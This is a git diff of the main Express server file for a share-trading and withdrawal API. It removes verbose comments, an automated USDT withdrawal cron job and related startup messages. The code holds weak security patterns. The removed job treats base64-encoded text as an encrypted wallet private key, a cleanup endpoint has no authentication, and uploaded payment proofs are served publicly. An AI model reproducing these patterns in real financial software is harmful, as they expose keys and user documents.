@@ -79,9 +79,7 @@ mongoose.set('strictQuery', true);
 // Display important environment variables
 console.log('======================================');
 console.log(`NODE_ENV: ${AppConfig.NODE_ENV}`);
-console.log(`LENCO_API_KEY configured: ${process.env.LENCO_API_KEY ? 'Yes' : 'No'}`);
 console.log(`MONGODB_URI configured: ${process.env.MONGODB_URI ? 'Yes' : 'No'}`);
-console.log(`BNB_RPC_URL configured: ${process.env.BNB_RPC_URL ? 'Yes' : 'No'}`);
 console.log(`Storage Method: MongoDB + Legacy File System`);
 console.log(`Enhanced Features: Logging, Compression, Security, Share Resale Marketplace`);
 console.log('======================================');
@@ -146,7 +144,7 @@ const corsOptions = {
   maxAge: 86400 // 24 hours
 };
 
-// Apply CORS middleware early - FIXED: Removed duplicate
+// Apply CORS middleware
 app.use(cors(corsOptions));
 app.options('*', cors(corsOptions));
 
@@ -176,10 +174,10 @@ app.use(helmet({
   } : false
 }));
 
-// Enhanced Rate limiting - FIXED: Increased limits
+// Rate limiting
 const limiter = rateLimit({
   windowMs: 15 * 60 * 1000, // 15 minutes
-  max: AppConfig.IS_PRODUCTION ? 1000 : 10000, // Increased from 100 to 1000 in production
+  max: AppConfig.IS_PRODUCTION ? 1000 : 10000,
   message: {
     success: false,
     message: 'Too many requests from this IP, please try again later',
@@ -228,27 +226,18 @@ const connectDB = async () => {
 
     console.log('📍 MongoDB URI found:', mongoUri.includes('@') ? 'mongodb+srv://***:***@' + mongoUri.split('@')[1] : mongoUri);
     
-    // Enhanced connection options
+    // Connection options
     const options = {
-      // Essential connection options (still required)
       useNewUrlParser: true,
       useUnifiedTopology: true,
-      
-      // Timeout settings
-      serverSelectionTimeoutMS: 15000, // 15 seconds
-      socketTimeoutMS: 45000,          // 45 seconds  
-      connectTimeoutMS: 15000,         // 15 seconds
-      
-      // Connection pool settings (enhanced)
+      serverSelectionTimeoutMS: 15000,
+      socketTimeoutMS: 45000,
+      connectTimeoutMS: 15000,
       maxPoolSize: AppConfig.IS_PRODUCTION ? 20 : 10,
       minPoolSize: AppConfig.IS_PRODUCTION ? 5 : 1,
       maxIdleTimeMS: 30000,
-      
-      // Retry settings
       retryWrites: true,
       retryReads: true,
-      
-      // Additional production optimizations
       ...(AppConfig.IS_PRODUCTION && {
         readPreference: 'secondaryPreferred',
         readConcern: { level: 'majority' },
@@ -265,7 +254,6 @@ const connectDB = async () => {
     console.log(`🏠 Host: ${mongoose.connection.host}`);
     console.log(`🔌 Connection state: ${mongoose.connection.readyState}`);
     
-    // Set up enhanced connection monitoring
     setupDatabaseMonitoring();
     
     return true;
@@ -274,7 +262,6 @@ const connectDB = async () => {
     console.error('\n❌ Database connection failed:');
     console.error('Error message:', error.message);
     
-    // Enhanced error diagnosis
     if (error.message.includes('ENOTFOUND')) {
       console.error('🌐 DNS resolution failed - check your MongoDB URI');
     } else if (error.message.includes('authentication failed')) {
@@ -307,9 +294,8 @@ function setupDatabaseMonitoring() {
     } catch (error) {
       logger.warn('Database health check failed', { error: error.message });
     }
-  }, 30000); // Check every 30 seconds
+  }, 30000);
 
-  // Enhanced event listeners
   mongoose.connection.on('connected', () => {
     console.log('🔗 Mongoose connected to MongoDB');
     logger.info('Database connected successfully');
@@ -324,7 +310,6 @@ function setupDatabaseMonitoring() {
     console.log('🔌 Mongoose disconnected from MongoDB');
     logger.warn('Database disconnected');
     
-    // Auto-reconnect attempt
     setTimeout(() => {
       if (mongoose.connection.readyState === 0) {
         console.log('🔄 Attempting automatic reconnection...');
@@ -343,14 +328,13 @@ function setupDatabaseMonitoring() {
 app.use(express.json({ 
   limit: '100mb',
   verify: (req, res, buf) => {
-    req.rawBody = buf; // Store raw body for webhook verification
+    req.rawBody = buf;
   }
 }));
 app.use(express.urlencoded({ extended: true, limit: '100mb' }));
 
 // Enhanced timeout middleware with request ID
 app.use((req, res, next) => {
-  // Generate unique request ID for tracing
   req.id = require('crypto').randomUUID();
   
   req.setTimeout(25000, () => {
@@ -370,7 +354,6 @@ app.use((req, res, next) => {
     }
   });
   
-  // Enhanced response helpers
   res.success = (data, message = 'Success', meta = {}) => {
     res.json({
       success: true,
@@ -422,7 +405,7 @@ app.use((req, res, next) => {
   next();
 });
 
-// Add debugging middleware to log all requests in development - NEW
+// Debug middleware for development
 if (AppConfig.IS_DEVELOPMENT) {
   app.use('/api', (req, res, next) => {
     console.log(`🔍 API Request: ${req.method} ${req.path}`);
@@ -444,7 +427,7 @@ const staticOptions = {
     res.set({
       'Access-Control-Allow-Origin': '*',
       'Access-Control-Allow-Methods': 'GET, OPTIONS',
-      'X-Served-By': 'AfriMobile-API-Enhanced',
+      'X-Served-By': 'AfriMobile-API',
       'X-Content-Type-Options': 'nosniff',
       'Cache-Control': AppConfig.IS_PRODUCTION ? 'public, max-age=86400' : 'no-cache'
     });
@@ -454,10 +437,12 @@ const staticOptions = {
 app.use('/uploads', express.static(path.join(__dirname, 'uploads'), staticOptions));
 app.use('/cofounder-payment-proofs', express.static(path.join(__dirname, 'uploads', 'cofounder-payment-proofs'), staticOptions));
 
+
+
 // Setup Swagger documentation
 setupSwagger(app);
 
-// Add a simple test endpoint that bypasses most middleware - NEW
+// Simple test endpoint
 app.get('/api/simple-test', (req, res) => {
   res.json({
     success: true,
@@ -475,7 +460,7 @@ app.get('/api/simple-test', (req, res) => {
   });
 });
 
-// Enhanced Database status endpoint
+// Database status endpoint
 app.get('/api/db-status', (req, res) => {
   const dbState = mongoose.connection.readyState;
   const states = {
@@ -493,7 +478,6 @@ app.get('/api/db-status', (req, res) => {
       name: mongoose.connection.name,
       host: mongoose.connection.host,
       readyState: dbState,
-      // Enhanced connection info
       collections: mongoose.connection.collections ? Object.keys(mongoose.connection.collections).length : 0,
       models: mongoose.connection.models ? Object.keys(mongoose.connection.models).length : 0
     },
@@ -514,9 +498,8 @@ app.get('/api/db-status', (req, res) => {
   });
 });
 
-// Enhanced API monitoring middleware - FIXED: Made database dependency less strict
+// API monitoring middleware
 app.use('/api', (req, res, next) => {
-  // Allow certain endpoints to work without database
   const allowedWithoutDB = [
     '/api/cors-test', 
     '/api/system/info', 
@@ -535,8 +518,6 @@ app.use('/api', (req, res, next) => {
     });
   }
   
-  // CORS is already handled by the main middleware above
-  // Just handle OPTIONS requests if they somehow get here
   if (req.method === 'OPTIONS') {
     return res.status(200).end();
   }
@@ -545,10 +526,9 @@ app.use('/api', (req, res, next) => {
 });
 
 // ============================================================================
-// API ROUTES - All application endpoints
+// API ROUTES
 // ============================================================================
 
-// Existing routes
 app.use('/api/users', require('./routes/userRoutes'));
 app.use('/api/shares', require('./routes/shareRoutes'));
 app.use('/api/cofounder', require('./routes/coFounderShareRoutes'));
@@ -561,36 +541,23 @@ app.use('/api/withdrawal', require('./routes/withdrawalRoutes'));
 app.use('/api/withdrawal/admin/control', require('./routes/adminWithdrawalControlRoutes'));
 app.use('/api/exchange-rates', require('./routes/exchangeRateRoutes'));
 app.use('/api/management', require('./routes/managementRoutes'));
-// DISABLED: Old installment routes (Feb 2026)
-// app.use('/api/shares/installment', require('./routes/installmentRoutes'));
-// app.use('/api/shares/cofounder/installment', require('./routes/coFounderInstallmentRoutes'));
-// NEW: Unified Installment Plan System
 app.use('/api/installments', require('./routes/installmentPlanRoutes'));
 app.use('/api/share-packages', require('./routes/sharePackageRoutes'));
 app.use('/api/admin/analytics', require('./routes/adminAnalyticsRoutes'));
 app.use('/api/shares/tiers', require('./routes/tierRoutes'));
 
-// ============================================================================
-// NEW: Share Resale & OTC Marketplace Routes (Feb 2026)
-// ============================================================================
-// Enables peer-to-peer share trading with automatic transfers
-// Documentation: GET http://localhost:5000/api-docs#/Share%20Marketplace
-// Features:
-//   - Public marketplace browsing
-//   - Create share listings
-//   - Make/accept purchase offers  
-//   - Multiple payment methods (bank transfer, crypto)
-//   - Automatic share transfer on payment confirmation
+// Share Resale & OTC Marketplace Routes
 app.use('/api/shares', require('./routes/shareListings'));
-app.use('/api/executives',  require('./routes/executiveRoutes'));
+app.use('/api/executives', require('./routes/executiveRoutes'));
 app.use('/api/franchise', require('./routes/franchiseRoutes'));
 app.use('/api/preorders', require('./routes/preOrderRoutes'));
 app.use('/api/loans', require('./routes/shareLoanRoutes')); 
+
 // ============================================================================
 // END API ROUTES
 // ============================================================================
 
-// Enhanced Health Monitor System Endpoints
+// Health Monitor System Endpoint
 app.get('/api/system/health-status', async (req, res) => {
   try {
     const healthMonitor = global.healthMonitor;
@@ -625,7 +592,7 @@ app.get('/api/system/health-status', async (req, res) => {
   }
 });
 
-// Enhanced debug endpoints
+// CORS test endpoint
 app.get('/api/cors-test', (req, res) => {
   res.success({
     message: 'CORS is working!',
@@ -637,11 +604,11 @@ app.get('/api/cors-test', (req, res) => {
   }, 'CORS test successful');
 });
 
-// Enhanced system info endpoint
+// System info endpoint
 app.get('/api/system/info', (req, res) => {
   res.success({
     server: {
-      version: '2.0.0-enhanced',
+      version: '2.0.0',
       environment: AppConfig.NODE_ENV,
       uptime: process.uptime(),
       memory: process.memoryUsage(),
@@ -658,9 +625,7 @@ app.get('/api/system/info', (req, res) => {
       'Compression Support',
       'Health Monitoring',
       'Auto-Reconnection',
-      'Crypto Withdrawal System',
-      'Automated USDT Processing',
-      'Share Resale & OTC Marketplace (NEW)'
+      'Share Resale & OTC Marketplace'
     ],
     database: {
       connected: mongoose.connection.readyState === 1,
@@ -670,11 +635,11 @@ app.get('/api/system/info', (req, res) => {
   }, 'System information retrieved');
 });
 
-// Enhanced Root route - Health check
+// Root route - Health check
 app.get('/', (req, res) => {
   res.success({
-    message: 'AfriMobile API - Enhanced Version',
-    version: '2.0.0-enhanced',
+    message: 'AfriMobile API',
+    version: '2.0.0',
     environment: AppConfig.NODE_ENV,
     database: {
       connected: mongoose.connection.readyState === 1,
@@ -686,7 +651,6 @@ app.get('/', (req, res) => {
       healthMonitoring: !!global.healthMonitor,
       requestTracing: true,
       enhancedSecurity: true,
-      cryptoWithdrawals: true,
       shareResaleMarketplace: true
     },
     endpoints: {
@@ -700,11 +664,10 @@ app.get('/', (req, res) => {
   }, 'AfriMobile API is running successfully');
 });
 
-// Enhanced Error handling middleware
+// Error handling middleware
 app.use((err, req, res, next) => {
   console.error('Error caught by global handler:', err.stack);
   
-  // Log detailed error information
   logger.error('Global error handler', {
     error: err.message,
     stack: err.stack,
@@ -715,7 +678,6 @@ app.use((err, req, res, next) => {
     requestId: req.id
   });
 
-  // Handle specific error types
   if (err.name === 'ValidationError') {
     return res.status(400).json({
       success: false,
@@ -744,7 +706,6 @@ app.use((err, req, res, next) => {
     });
   }
 
-  // Default error response
   res.status(err.status || 500).json({
     success: false,
     message: AppConfig.IS_PRODUCTION ? 'Internal server error' : err.message,
@@ -754,7 +715,7 @@ app.use((err, req, res, next) => {
   });
 });
 
-// Enhanced 404 handler
+// 404 handler
 app.use((req, res) => {
   logger.warn('404 - Resource not found', {
     method: req.method,
@@ -783,7 +744,7 @@ app.use((req, res) => {
   });
 });
 
-// Enhanced Background Jobs Manager
+// Background Jobs Manager
 class BackgroundJobsManager {
   constructor() {
     this.jobs = [];
@@ -845,12 +806,12 @@ class BackgroundJobsManager {
 
 const jobsManager = new BackgroundJobsManager();
 
-// MAIN APP STARTUP FUNCTION (keeping your exact structure)
+// MAIN APP STARTUP FUNCTION
 async function startApp() {
   try {
-    console.log('🚀 Starting AfriMobile API - Enhanced Version...');
+    console.log('🚀 Starting AfriMobile API...');
     
-    // Step 1: Connect to database FIRST
+    // Connect to database
     const dbConnected = await connectDB();
     
     if (!dbConnected) {
@@ -858,10 +819,7 @@ async function startApp() {
       logger.error('Database connection failed during startup');
     }
     
-    // Step 2: Initialize health monitor after DB connection
-   
-    
-    // Step 3: Start the server
+    // Start the server
     const PORT = AppConfig.PORT;
     const server = app.listen(PORT, () => {
       console.log('\n**********************************************');
@@ -882,23 +840,20 @@ async function startApp() {
         memoryUsage: process.memoryUsage()
       });
       
-      // Store server reference for graceful shutdown
       global.server = server;
     });
 
-    // Enhanced server timeout configuration
     server.timeout = 30000;
     server.keepAliveTimeout = 61000;
     server.headersTimeout = 62000;
     
-    // Step 4: Start background jobs AFTER everything is ready
+    // Start background jobs
     if (dbConnected) {
       setTimeout(async () => {
         console.log('======================================');
         console.log('Starting background jobs...');
         
         try {
-          // Admin setup
           const { setUserAsAdmin, grantAdminRights } = require('./controller/userController');
           await setUserAsAdmin();
           await grantAdminRights();
@@ -909,237 +864,7 @@ async function startApp() {
           logger.error('Admin setup failed', { error: error.message });
         }
         
-        // ========== START CRYPTO WITHDRAWAL CRON JOBS (NEW) ==========
-        try {
-          const User = require('./models/User');
-          const Withdrawal = require('./models/Withdrawal');
-          const Referral = require('./models/Referral');
-          const ReferralTransaction = require('./models/ReferralTransaction');
-          const Payment = require('./models/Payment');
-          const { sendEmail } = require('./utils/emailService');
-          const ethers = require('ethers');
-          const mongoose = require('mongoose');
-
-          const BNB_CONFIG = {
-            rpcUrl: process.env.BNB_RPC_URL || 'https://bsc-dataseed.binance.org/',
-            chainId: 56,
-            USDT_CONTRACT: '0x55d398326f99059fF775485246999027B3197955',
-            USDT_DECIMALS: 18
-          };
-
-          // ========== PROCESS CRYPTO WITHDRAWALS CRON JOB (Every 5 minutes) ==========
-          const processCryptoCron = {
-            job: cron.schedule('*/5 * * * *', async () => {
-              try {
-                console.log('[CRYPTO-CRON] Starting crypto withdrawal processing...');
-                logger.info('[CRYPTO-CRON] Processing pending crypto withdrawals');
-
-                if (!global.adminCryptoWallet) {
-                  console.log('[CRYPTO-CRON] Admin wallet not configured, skipping processing');
-                  return;
-                }
-
-                const pending = await Withdrawal.find({
-                  withdrawalType: 'crypto',
-                  status: 'pending'
-                }).limit(10);
-
-                if (pending.length === 0) {
-                  console.log('[CRYPTO-CRON] No pending crypto withdrawals');
-                  return;
-                }
-
-                console.log(`[CRYPTO-CRON] Found ${pending.length} pending withdrawals`);
-
-                const provider = new ethers.providers.JsonRpcProvider(BNB_CONFIG.rpcUrl);
-                const privateKey = Buffer.from(global.adminCryptoWallet.encryptedPrivateKey, 'base64').toString();
-                const signer = new ethers.Wallet(privateKey, provider);
-
-                let processed = 0;
-                let failed = 0;
-
-                for (const withdrawal of pending) {
-                  try {
-                    console.log(`[CRYPTO-CRON] Processing withdrawal ${withdrawal._id}...`);
-                    withdrawal.status = 'processing';
-                    await withdrawal.save();
-
-                    const usdtContract = new ethers.Contract(
-                      BNB_CONFIG.USDT_CONTRACT,
-                      [
-                        'function transfer(address to, uint256 amount) public returns (bool)',
-                        'function balanceOf(address) view returns (uint256)'
-                      ],
-                      signer
-                    );
-
-                    const amountWei = ethers.utils.parseUnits(
-                      withdrawal.cryptoDetails.amountUSDT.toString(),
-                      BNB_CONFIG.USDT_DECIMALS
-                    );
-
-                    const balance = await usdtContract.balanceOf(signer.address);
-                    if (balance.lt(amountWei)) {
-                      throw new Error('Insufficient USDT balance in admin wallet');
-                    }
-
-                    const tx = await usdtContract.transfer(withdrawal.cryptoDetails.walletAddress, amountWei);
-                    const receipt = await tx.wait();
-
-                    withdrawal.status = 'paid';
-                    withdrawal.cryptoDetails.transactionHash = receipt.transactionHash;
-                    withdrawal.cryptoDetails.blockNumber = receipt.blockNumber;
-                    withdrawal.processedAt = new Date();
-                    await withdrawal.save();
-
-                    await Referral.findOneAndUpdate(
-                      { user: withdrawal.user },
-                      {
-                        $inc: {
-                          pendingWithdrawals: -withdrawal.amount,
-                          totalWithdrawn: withdrawal.amount
-                        }
-                      }
-                    );
-
-                    const transaction = new ReferralTransaction({
-                      user: withdrawal.user,
-                      type: 'crypto_withdrawal',
-                      amount: -withdrawal.amount,
-                      description: `USDT withdrawal: ${withdrawal.cryptoDetails.amountUSDT} USDT to ${withdrawal.cryptoDetails.walletAddress}`,
-                      status: 'completed',
-                      reference: receipt.transactionHash
-                    });
-                    await transaction.save();
-
-                    const user = await User.findById(withdrawal.user);
-                    try {
-                      await sendEmail({
-                        email: user.email,
-                        subject: '✅ Crypto Withdrawal Completed!',
-                        html: `
-                          <h2>Your Withdrawal Has Been Sent!</h2>
-                          <p>Hello ${user.name},</p>
-                          <p>Your ${withdrawal.cryptoDetails.amountUSDT} USDT withdrawal has been successfully transferred.</p>
-                          <p><strong>Transaction Hash:</strong> <code>${receipt.transactionHash}</code></p>
-                          <p><strong>Recipient Wallet:</strong> <code>${withdrawal.cryptoDetails.walletAddress}</code></p>
-                          <p><strong>Amount in NGN:</strong> ₦${withdrawal.amount.toLocaleString()}</p>
-                          <p>You can view the transaction on <a href="https://bscscan.com/tx/${receipt.transactionHash}">BscScan</a></p>
-                          <p>Thank you for using AfriMobile!</p>
-                        `
-                      });
-                    } catch (emailError) {
-                      console.error('[CRYPTO-CRON] Failed to send email:', emailError.message);
-                      logger.warn('[CRYPTO-CRON] Email notification failed', { error: emailError.message });
-                    }
-
-                    console.log(`[CRYPTO-CRON] ✅ Processed withdrawal ${withdrawal._id}`);
-                    processed++;
-                  } catch (error) {
-                    console.error(`[CRYPTO-CRON] ❌ Failed to process ${withdrawal._id}:`, error.message);
-                    logger.error('[CRYPTO-CRON] Failed to process withdrawal', {
-                      withdrawalId: withdrawal._id,
-                      error: error.message
-                    });
-
-                    withdrawal.status = 'failed';
-                    withdrawal.failureReason = error.message;
-                    await withdrawal.save();
-
-                    await Referral.findOneAndUpdate(
-                      { user: withdrawal.user },
-                      { $inc: { pendingWithdrawals: -withdrawal.amount } }
-                    );
-
-                    failed++;
-                  }
-                }
-
-                console.log(`[CRYPTO-CRON] Completed: ${processed} success, ${failed} failed`);
-                logger.info('[CRYPTO-CRON] Processing cycle completed', { processed, failed });
-              } catch (error) {
-                console.error('[CRYPTO-CRON] Error in crypto processing cron:', error.message);
-                logger.error('[CRYPTO-CRON] Cron job error', { error: error.message, stack: error.stack });
-              }
-            }),
-            start: function() {
-              console.log('[CRYPTO-CRON] Crypto processing job started (every 5 minutes)');
-            },
-            stop: function() {
-              this.job.stop();
-              console.log('[CRYPTO-CRON] Crypto processing job stopped');
-            }
-          };
-
-          // ========== VERIFY CRYPTO TRANSACTIONS CRON JOB (Every hour) ==========
-          const verifyCryptoCron = {
-            job: cron.schedule('0 * * * *', async () => {
-              try {
-                console.log('[CRYPTO-CRON] Starting transaction verification...');
-                logger.info('[CRYPTO-CRON] Verifying paid crypto withdrawals');
-
-                const provider = new ethers.providers.JsonRpcProvider(BNB_CONFIG.rpcUrl);
-
-                const paidWithdrawals = await Withdrawal.find({
-                  withdrawalType: 'crypto',
-                  status: 'paid',
-                  'cryptoDetails.transactionHash': { $exists: true }
-                }).limit(20);
-
-                console.log(`[CRYPTO-CRON] Verifying ${paidWithdrawals.length} transactions`);
-
-                for (const withdrawal of paidWithdrawals) {
-                  try {
-                    const receipt = await provider.getTransactionReceipt(withdrawal.cryptoDetails.transactionHash);
-
-                    if (receipt) {
-                      if (receipt.status === 1) {
-                        withdrawal.cryptoDetails.blockNumber = receipt.blockNumber;
-                        await withdrawal.save();
-                        console.log(`[CRYPTO-CRON] ✅ Verified transaction ${withdrawal._id}`);
-                      } else if (receipt.status === 0) {
-                        console.log(`[CRYPTO-CRON] ⚠️ Transaction failed for ${withdrawal._id}`);
-                        withdrawal.status = 'failed';
-                        withdrawal.failureReason = 'Transaction failed on blockchain';
-                        await withdrawal.save();
-                      }
-                    }
-                  } catch (error) {
-                    console.error(`[CRYPTO-CRON] Error verifying ${withdrawal._id}:`, error.message);
-                  }
-                }
-
-                console.log('[CRYPTO-CRON] Verification cycle completed');
-                logger.info('[CRYPTO-CRON] Transaction verification completed', { 
-                  count: paidWithdrawals.length 
-                });
-              } catch (error) {
-                console.error('[CRYPTO-CRON] Error in verification cron:', error.message);
-                logger.error('[CRYPTO-CRON] Verification cron error', { error: error.message });
-              }
-            }),
-            start: function() {
-              console.log('[CRYPTO-CRON] Verification job started (every 1 hour)');
-            },
-            stop: function() {
-              this.job.stop();
-              console.log('[CRYPTO-CRON] Verification job stopped');
-            }
-          };
-
-          // Add crypto jobs to manager
-          jobsManager.addJob('processCryptoWithdrawals', processCryptoCron);
-          jobsManager.addJob('verifyCryptoTransactions', verifyCryptoCron);
-
-          console.log('✅ Crypto withdrawal cron jobs initialized');
-          logger.info('Crypto withdrawal cron jobs initialized successfully');
-        } catch (error) {
-          console.error('❌ Error initializing crypto cron jobs:', error.message);
-          logger.error('Failed to initialize crypto cron jobs', { error: error.message });
-        }
-        // ========== END CRYPTO WITHDRAWAL CRON JOBS ==========
-
-        // Start withdrawal verification cron jobs
+        // Start bank withdrawal verification cron jobs
         try {
           const withdrawalCronJobs = require('./withdrawalCronJobs');
           jobsManager.addJob('verifyProcessingWithdrawals', withdrawalCronJobs.verifyProcessingWithdrawals);
@@ -1157,18 +882,11 @@ async function startApp() {
         // Start installment and referral jobs if in production
         if (AppConfig.IS_PRODUCTION) {
           try {
-            // NEW: Unified installment reminder scheduler
-            try {
-              const { startInstallmentReminderScheduler } = require('./utils/installmentReminder');
-              startInstallmentReminderScheduler();
-              console.log('✅ Installment reminder scheduler started');
-            } catch (err) {
-              console.error('⚠️ Installment reminder scheduler failed:', err.message);
-            }
+            const { startInstallmentReminderScheduler } = require('./utils/installmentReminder');
+            startInstallmentReminderScheduler();
+            console.log('✅ Installment reminder scheduler started');
             
-            // Referral sync jobs
             const referralCronJobs = require('./referralCronJobs');
-            // Add referral jobs to manager if they have start/stop methods
             console.log('✅ Referral sync jobs configured');
             
             logger.info('Production background jobs initialized');
@@ -1180,7 +898,6 @@ async function startApp() {
           console.log('ℹ️ Development mode: Some background jobs disabled');
         }
         
-        // Start the jobs manager
         jobsManager.startAll();
         
         console.log('✅ Background jobs initialization complete');
@@ -1196,12 +913,11 @@ async function startApp() {
   }
 }
 
-// Enhanced Graceful shutdown handling
+// Graceful shutdown handling
 async function gracefulShutdown(signal) {
   console.log(`🛑 ${signal} received, shutting down gracefully...`);
   logger.info(`Graceful shutdown initiated by ${signal}`);
   
-  // Stop accepting new requests
   if (global.server) {
     global.server.close(() => {
       console.log('✅ HTTP server closed');
@@ -1209,7 +925,6 @@ async function gracefulShutdown(signal) {
     });
   }
   
-  // Stop background jobs
   try {
     jobsManager.stopAll();
     console.log('✅ Background jobs stopped');
@@ -1218,7 +933,6 @@ async function gracefulShutdown(signal) {
     logger.error('Error stopping background jobs', { error: error.message });
   }
   
-  // Stop health monitor
   try {
     if (global.healthMonitor && typeof global.healthMonitor.stopMonitoring === 'function') {
       global.healthMonitor.stopMonitoring();
@@ -1229,7 +943,6 @@ async function gracefulShutdown(signal) {
     logger.error('Error stopping health monitor', { error: error.message });
   }
   
-  // Close database connection
   try {
     await mongoose.connection.close();
     console.log('✅ Database connection closed');
@@ -1244,17 +957,16 @@ async function gracefulShutdown(signal) {
   process.exit(0);
 }
 
-// Enhanced Signal handlers
+// Signal handlers
 process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
 process.on('SIGINT', () => gracefulShutdown('SIGINT'));
 
-// Enhanced uncaught exception handling
+// Uncaught exception handling
 process.on('uncaughtException', (err) => {
   console.error('💥 Uncaught Exception:', err);
   console.error('Stack:', err.stack);
   logger.error('Uncaught Exception', { error: err.message, stack: err.stack });
   
-  // Attempt graceful shutdown
   gracefulShutdown('UNCAUGHT_EXCEPTION').then(() => {
     process.exit(1);
   }).catch(() => {
@@ -1262,12 +974,11 @@ process.on('uncaughtException', (err) => {
   });
 });
 
-// Enhanced unhandled promise rejection handling
+// Unhandled promise rejection handling
 process.on('unhandledRejection', (reason, promise) => {
   console.error('💥 Unhandled Rejection at:', promise, 'reason:', reason);
   logger.error('Unhandled Promise Rejection', { reason, promise });
   
-  // In production, attempt graceful shutdown
   if (AppConfig.IS_PRODUCTION) {
     gracefulShutdown('UNHANDLED_REJECTION').then(() => {
       process.exit(1);
@@ -1277,37 +988,35 @@ process.on('unhandledRejection', (reason, promise) => {
   }
 });
 
-// Enhanced process monitoring
+// Process monitoring for production
 if (AppConfig.IS_PRODUCTION) {
-  // Monitor memory usage
   setInterval(() => {
     const memUsage = process.memoryUsage();
     const memUsageMB = Math.round(memUsage.heapUsed / 1024 / 1024);
     
-    if (memUsageMB > 500) { // Alert if using more than 500MB
+    if (memUsageMB > 500) {
       logger.warn('High memory usage detected', { 
         memoryUsageMB: memUsageMB,
         memoryUsage: memUsage 
       });
     }
     
-    // Force garbage collection if available and memory is high
     if (global.gc && memUsageMB > 400) {
       global.gc();
       logger.info('Forced garbage collection due to high memory usage');
     }
-  }, 60000); // Check every minute
+  }, 60000);
 }
 
-// Enhanced startup information display
-function displayEnhancedStartupInfo() {
+
+// Startup information display
+function displayStartupInfo() {
   const baseUrl = AppConfig.IS_PRODUCTION 
     ? 'https://afrimobile-d240af77c383.herokuapp.com'
     : `http://localhost:${AppConfig.PORT}`;
 
   console.log('\n' + '='.repeat(80));
-  console.log('🚀 AFRIMOBILE API - ENHANCED VERSION 2.0');
-  console.log('    with Crypto Withdrawals & Share Resale Marketplace');
+  console.log('🚀 AFRIMOBILE API');
   console.log('='.repeat(80));
   console.log(`Environment: ${AppConfig.NODE_ENV}`);
   console.log(`Process ID: ${process.pid}`);
@@ -1325,14 +1034,7 @@ function displayEnhancedStartupInfo() {
   console.log(`   CORS Test: ${baseUrl}/api/cors-test`);
   console.log(`   Simple Test: ${baseUrl}/api/simple-test`);
   console.log('='.repeat(80));
-  console.log('💰 CRYPTO WITHDRAWAL ENDPOINTS:');
-  console.log(`   Exchange Rates: ${baseUrl}/api/withdrawal/crypto/rates`);
-  console.log(`   Setup Wallet: POST ${baseUrl}/api/withdrawal/crypto/wallet/setup`);
-  console.log(`   Request Withdrawal: POST ${baseUrl}/api/withdrawal/crypto/request`);
-  console.log(`   Withdrawal History: ${baseUrl}/api/withdrawal/crypto/history`);
-  console.log(`   Admin Panel: POST ${baseUrl}/api/withdrawal/admin/crypto/wallet/setup`);
-  console.log('='.repeat(80));
-  console.log('📊 SHARE RESALE & OTC MARKETPLACE ENDPOINTS (NEW):');
+  console.log('📊 SHARE RESALE & OTC MARKETPLACE ENDPOINTS:');
   console.log(`   Browse Listings: GET ${baseUrl}/api/shares/listings`);
   console.log(`   View Listing: GET ${baseUrl}/api/shares/listings/{id}`);
   console.log(`   Create Listing: POST ${baseUrl}/api/shares/listings`);
@@ -1349,7 +1051,7 @@ function displayEnhancedStartupInfo() {
   console.log(`   Payment Proofs: ${baseUrl}/uploads/payment-proofs/`);
   console.log(`   CoFounder Proofs: ${baseUrl}/uploads/cofounder-payment-proofs/`);
   console.log('='.repeat(80));
-  console.log('✨ ENHANCED FEATURES:');
+  console.log('✨ FEATURES:');
   console.log('   ✅ Advanced MongoDB Connection with Auto-Reconnect');
   console.log('   ✅ Winston Logging with Daily Rotation');
   console.log('   ✅ Request Tracing with Unique IDs');
@@ -1363,24 +1065,18 @@ function displayEnhancedStartupInfo() {
   console.log('   ✅ Fixed CORS Configuration');
   console.log('   ✅ Increased Rate Limits');
   console.log('   ✅ Database-Independent Test Endpoints');
-  console.log('   ✅ Crypto Withdrawal System');
-  console.log('   ✅ Automated USDT Processing');
-  console.log('   ✅ BNB Smart Chain Integration');
-  console.log('   ✅ Peer-to-Peer Share Trading (NEW)');
-  console.log('   ✅ OTC Marketplace (NEW)');
-  console.log('   ✅ Automatic Share Transfers (NEW)');
-  console.log('   ✅ Multiple Payment Methods (NEW)');
+  console.log('   ✅ Peer-to-Peer Share Trading');
+  console.log('   ✅ OTC Marketplace');
+  console.log('   ✅ Automatic Share Transfers');
   console.log('='.repeat(80));
   
   const dbStatus = mongoose.connection.readyState === 1 ? 'Connected' : 'Disconnected';
   const healthStatus = global.healthMonitor ? 'Active' : 'Inactive';
   const jobsStatus = jobsManager.isRunning ? 'Running' : 'Stopped';
-  const adminWallet = global.adminCryptoWallet ? 'Configured' : 'Not Configured';
   
   console.log(`🎯 DATABASE: ${dbStatus}`);
   console.log(`🏥 HEALTH MONITOR: ${healthStatus}`);
   console.log(`🔄 BACKGROUND JOBS: ${jobsStatus}`);
-  console.log(`💼 ADMIN CRYPTO WALLET: ${adminWallet}`);
   console.log(`📊 MEMORY USAGE: ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)}MB`);
   console.log('='.repeat(80));
   
@@ -1397,20 +1093,17 @@ function displayEnhancedStartupInfo() {
     console.log('   📊 Performance monitoring active');
     console.log('   🗜️ Response compression enabled');
     console.log('   🛡️ Rate limiting enforced');
-    console.log('   🤖 Automated crypto withdrawal processing');
   }
   
   console.log('='.repeat(80) + '\n');
 }
 
-// Additional utility functions for enhanced functionality
+// Enhanced utilities
 const EnhancedUtils = {
-  // System cleanup utility
   async performSystemCleanup() {
     try {
       logger.info('Starting system cleanup...');
       
-      // Clean up old log files (keep last 30 days)
       const logsDir = path.join(process.cwd(), 'logs');
       if (fs.existsSync(logsDir)) {
         const files = fs.readdirSync(logsDir);
@@ -1427,7 +1120,6 @@ const EnhancedUtils = {
         }
       }
       
-      // Force garbage collection if available
       if (global.gc) {
         global.gc();
         logger.info('Forced garbage collection');
@@ -1439,7 +1131,6 @@ const EnhancedUtils = {
     }
   },
 
-  // Get comprehensive system stats
   getSystemStats() {
     return {
       system: {
@@ -1462,19 +1153,14 @@ const EnhancedUtils = {
       health: {
         monitor: !!global.healthMonitor,
         status: global.healthMonitor ? 'active' : 'inactive'
-      },
-      crypto: {
-        adminWalletConfigured: !!global.adminCryptoWallet,
-        processingEnabled: !!global.adminCryptoWallet
       }
     };
   }
 };
 
-// Add system cleanup endpoint
+// System cleanup endpoint
 app.post('/api/system/cleanup', async (req, res) => {
   try {
-    // Add authentication check here if needed
     await EnhancedUtils.performSystemCleanup();
     res.success(null, 'System cleanup completed successfully');
   } catch (error) {
